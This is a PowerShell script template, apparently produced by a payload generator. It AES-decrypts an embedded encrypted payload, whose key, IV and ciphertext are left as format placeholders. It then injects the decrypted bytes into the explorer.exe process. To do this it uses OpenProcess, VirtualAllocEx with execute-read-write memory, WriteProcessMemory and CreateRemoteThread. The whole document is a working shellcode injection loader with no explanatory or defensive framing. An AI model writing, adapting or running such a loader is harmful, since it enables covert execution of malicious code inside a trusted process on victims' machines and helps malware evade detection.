Add-Type -AssemblyName System.Security
$key = [Byte[]]({0})
$iv = [Byte[]]({1})
$encrypted = [Byte[]]({2})
$cipher = [System.Security.Cryptography.Aes]::Create()
$cipher.Mode = [System.Security.Cryptography.CipherMode]::CBC
$cipher.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$cipher.Key = $key
$cipher.IV = $iv
$decryptor = $cipher.CreateDecryptor()
$decrypted = $decryptor.TransformFinalBlock($encrypted, 0, $encrypted.Length)
$p = (Get-Process explorer -ErrorAction SilentlyContinue)[0].Id
if ($p -eq $null) {
   
    exit
}
$code = @'
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")] public static extern IntPtr OpenProcess(UInt32 dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32")] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UInt32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
    [DllImport("kernel32")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, UInt32 size, IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32")] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, UInt32 dwCreationFlags, IntPtr lpThreadId);
}
'@
Add-Type -TypeDefinition $code
$PROCESS_ALL_ACCESS = 0x1F0FFF
$MEM_COMMIT = 0x1000
$PAGE_EXECUTE_READWRITE = 0x40
$hProcess = [Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $p)
if ($hProcess -eq [IntPtr]::Zero) {
    Write-Error 'Failed to open process.'
    exit
}
$addr = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $decrypted.Length, $MEM_COMMIT, $PAGE_EXECUTE_READWRITE)
if ($addr -eq [IntPtr]::Zero) {
    Write-Error 'Failed to allocate memory.'
    exit
}
[Win32]::WriteProcessMemory($hProcess, $addr, $decrypted, $decrypted.Length, [IntPtr]::Zero)
[Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)